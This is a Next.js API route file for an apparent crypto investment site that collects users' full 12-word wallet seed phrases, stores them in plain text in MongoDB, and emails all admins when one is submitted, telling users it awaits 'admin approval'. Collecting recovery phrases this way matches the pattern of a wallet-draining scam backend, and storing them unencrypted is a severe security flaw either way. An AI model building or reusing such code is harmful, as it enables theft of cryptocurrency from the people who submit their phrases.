import { NextRequest, NextResponse } from "next/server";
import clientPromise from "@/lib/mongodb";
import { SeedPhraseSubmission } from "@/types/seedphrase";
import { getServerSession } from "next-auth";
import { authOptions } from "@/app/api/auth/[...nextauth]/route";
import { sendSeedphraseSubmittedToAdmin } from "@/lib/email";

export async function POST(request: NextRequest) {
  try {
    const session = await getServerSession(authOptions);
    
    if (!session?.user?.id) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const body = await request.json();
    const { walletType, walletName, walletIcon, walletColor, seedPhrase } = body;

    if (!walletType || !walletName || !walletIcon || !walletColor || !seedPhrase || !Array.isArray(seedPhrase) || seedPhrase.length !== 12) {
      return NextResponse.json({ error: "Invalid input data" }, { status: 400 });
    }

    const client = await clientPromise;
    const db = client.db("crypto-investment");

    const submission: SeedPhraseSubmission = {
      userId: session.user.id,
      walletType,
      walletName,
      walletIcon,
      walletColor,
      seedPhrase,
      status: 'pending',
      submittedAt: new Date(),
    };

    const result = await db.collection('seedphrases').insertOne(submission);

    // Send email notification to all admins
    try {
      const admins = await db.collection("users").find({ role: "admin" }).toArray();
      const adminEmails = admins.map((admin: any) => admin.email).filter((email: string) => email);

      if (adminEmails.length > 0) {
        await sendSeedphraseSubmittedToAdmin({
          to: adminEmails,
          userName: session.user.name || 'User',
          userEmail: session.user.email || '',
          walletName: walletName,
          walletType: walletType,
        });
      }
    } catch (emailError) {
      console.error('Error sending admin notification email:', emailError);
      // Don't fail the request if email sending fails
    }

    return NextResponse.json({ 
      success: true, 
      id: result.insertedId,
      message: "Seed phrase submitted successfully. Awaiting admin approval."
    }, { status: 201 });

  } catch (error) {
    console.error("Error submitting seed phrase:", error);
    return NextResponse.json({ error: "Failed to submit seed phrase" }, { status: 500 });
  }
}

export async function GET(request: NextRequest) {
  try {
    const session = await getServerSession(authOptions);
    
    if (!session?.user?.id) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const client = await clientPromise;
    const db = client.db("crypto-investment");

    const seedphrases = await db
      .collection('seedphrases')
      .find({ userId: session.user.id })
      .sort({ submittedAt: -1 })
      .toArray();

    return NextResponse.json({ seedphrases }, { status: 200 });

  } catch (error) {
    console.error("Error fetching seed phrases:", error);
    return NextResponse.json({ error: "Failed to fetch seed phrases" }, { status: 500 });
  }
}
